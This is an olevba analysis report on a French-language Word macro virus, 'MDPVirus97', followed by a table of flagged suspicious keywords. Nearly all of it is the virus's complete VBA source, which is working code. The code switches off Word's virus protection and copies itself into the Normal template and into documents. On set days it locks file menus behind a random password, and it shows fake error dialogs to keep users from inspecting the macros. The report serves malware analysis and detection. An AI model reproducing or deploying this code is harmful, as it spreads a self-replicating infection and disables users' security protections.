olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mdpvirus-44e68664e102258db7f4dbb20fe1f8ccc237d689
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mdpvirus-44e68664e102258db7f4dbb20fe1f8ccc237d689 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MDPVirus97.bas 
in file: Virus.MSWord.Mdpvirus-44e68664e102258db7f4dbb20fe1f8ccc237d689 - OLE stream: 'Macros/VBA/MDPVirus97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "01" Or DT$ = "11" Or DT$ = "21" Or DT$ = "30" Then
    MsgBox "ZeMacroKiller vous dit:" & Chr$(13) & "Mot De Passe pour accéder à certain menu", vbCritical, "MDPVirus 97"
End If
ErrorAE:
End Sub
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAN
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "MDPVirus97" Then
        MDPVirus97Installed = -1
    End If
Next i
If Not MDPVirusInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MDPVirus97", Object:=wdOrganizerObjectProjectItems
    MsgBox "HAHAHAHAHA!!!!!", vbCritical, "MDPVirus 97"
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MDPVirus97", Object:=wdOrganizerObjectProjectItems
End If
ErrorAN:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "MDPVirus97" Then
        MDPVirus97Installed = -1
    End If
Next i
If Not MDPVirusInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MDPVirus97", Object:=wdOrganizerObjectProjectItems
    MsgBox "Je suis là!!!!!!", vbCritical, "MDPVirus 97"
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MDPVirus97", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
End If
ErrorAO:
End Sub
Sub FileOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFO
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "01" Then
    Call MDPV97
    MDP$ = InputBox("Pour acceder à ce menu," & Chr$(13) & "Veuillez entrer le mot de passe du jour:", Title:="MDPVirus97")
    WOpen$ = WordBasic.[GetPrivateProfileString$]("MotDePasse", "Valeur", "Win.ini")
    If WOpen$ <> MDP$ Or WOpen$ = "" Then
        MsgBox "MOT DE PASSE INCORRECTE!!!" & Chr$(13) & "Accès Refusé!!!" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "MDPVirus97"
        GoTo Fin
    End If
    If WOpen$ = MDP$ Then
        MsgBox "MOT DE PASSE CORRECTE!!!!" & Chr$(13) & "Impossible...", vbInformation, "MDPVirus97"
        Dialogs(wdDialogFileOpen).Show
    End If
Else
    Dialogs(wdDialogFileOpen).Show
End If
Fin:
ErrorFO:
End Sub
Sub FileClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFC
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "11" Then
    Call MDPV97
    MDP$ = InputBox("Pour acceder à ce menu," & Chr$(13) & "Veuillez entrer le mot de passe du jour:", Title:="MDPVirus97")
    WOpen$ = WordBasic.[GetPrivateProfileString$]("MotDePasse", "Valeur", "Win.ini")
    If WOpen$ <> MDP$ Or WOpen$ = "" Then
        MsgBox "MOT DE PASSE INCORRECTE!!!" & Chr$(13) & "Utilisation Impossible!!!" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "MDPVirus97"
        GoTo Fin
    End If
    If WOpen$ = MDP$ Then
        MsgBox "MOT DE PASSE CORRECTE!!!!" & Chr$(13) & "T'es un bon...", vbInformation, "MDPVirus97"
        Application.Run MacroName:="FichierFermer"
    End If
Else
    Application.Run MacroName:="FichierFermer"
End If
Fin:
ErrorFC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "21" Then
    Call MDPV97
    MDP$ = InputBox("Pour acceder à ce menu," & Chr$(13) & "Veuillez entrer le mot de passe du jour:", Title:="MDPVirus97")
    WOpen$ = WordBasic.[GetPrivateProfileString$]("MotDePasse", "Valeur", "Win.ini")
    If WOpen$ <> MDP$ Or WOpen$ = "" Then
        MsgBox "MOT DE PASSE INCORRECTE!!!" & Chr$(13) & "Enregistrement inutilisable!!!" & Chr$(13) & "Dommage pour toi!!!!", vbCritical, "MDPVirus97"
        GoTo Fin
    End If
    If WOpen$ = MDP$ Then
        MsgBox "MOT DE PASSE CORRECTE!!!!" & Chr$(13) & "Mais, COMMENT as tu fait ?...", vbInformation, "MDPVirus97"
        Dialogs(wdDialogFileSaveAs).Show
        If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
    End If
Else
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
End If
Fin:
ErrorFSA:
End Sub
Sub FilePrint()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFP
Dim MyDate
MyDate = Date
DT$ = Mid(MyDate, 1, 2)
If DT$ = "30" Then
    Call MDPV97
    MDP$ = InputBox("Pour acceder à ce menu," & Chr$(13) & "Veuillez entrer le mot de passe du jour:", Title:="MDPVirus97")
    WOpen$ = WordBasic.[GetPrivateProfileString$]("MotDePasse", "Valeur", "Win.ini")
    If WOpen$ <> MDP$ Or WOpen$ = "" Then
        MsgBox "MOT DE PASSE INCORRECTE!!!" & Chr$(13) & "Menu Impression Inaccessible!!!" & Chr$(13) & "Essai Plus Tard!!!!", vbCritical, "MDPVirus97"
        GoTo Fin
    End If
    If WOpen$ = MDP$ Then
        MsgBox "MOT DE PASSE CORRECTE!!!!" & Chr$(13) & "Impression Autorisé...", vbInformation, "MDPVirus97"
        Dialogs(wdDialogFilePrint).Show
    End If
Else
    Dialogs(wdDialogFilePrint).Show
End If
Fin:
ErrorFP:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    MsgBox "Espace Mémoire Insuffisant.", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Private Sub MDPV97()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorMDPV97
Randomize
For i = 1 To 8
N$ = Int(Rnd * 15) + 1
If N$ = "1" Then
    Valeur$ = "A"
End If
If N$ = "2" Then
    Valeur$ = "B"
End If
If N$ = "3" Then
    Valeur$ = "C"
End If
If N$ = "4" Then
    Valeur$ = "D"
End If
If N$ = "5" Then
    Valeur$ = "E"
End If
If N$ = "6" Then
    Valeur$ = "F"
End If
If N$ = "7" Then
    Valeur$ = "G"
End If
If N$ = "8" Then
    Valeur$ = "H"
End If
If N$ = "9" Then
    Valeur$ = "I"
End If
If N$ = "10" Then
    Valeur$ = "J"
End If
If N$ = "11" Then
    Valeur$ = "§"
End If
If N$ = "12" Then
    Valeur$ = "*"
End If
If N$ = "13" Then
    Valeur$ = "¤"
End If
If N$ = "14" Then
    Valeur$ = "@"
End If
If N$ = "15" Then
    Valeur$ = "%"
End If
If i = 1 Then a$ = Valeur$
If i = 2 Then b$ = Valeur$
If i = 3 Then c$ = Valeur$
If i = 4 Then d$ = Valeur$
If i = 5 Then e$ = Valeur$
If i = 6 Then f$ = Valeur$
If i = 7 Then g$ = Valeur$
If i = 8 Then h$ = Valeur$
Next i
Total$ = a$ + b$ + c$ + d$ + e$ + f$ + g$ + h$
WordBasic.SetPrivateProfileString "MotDePasse", "Valeur", Total$, "Win.ini"
ErrorMDPV97:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    MsgBox "Une erreur est survenu lors de l'utilisation de cette fonction.", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

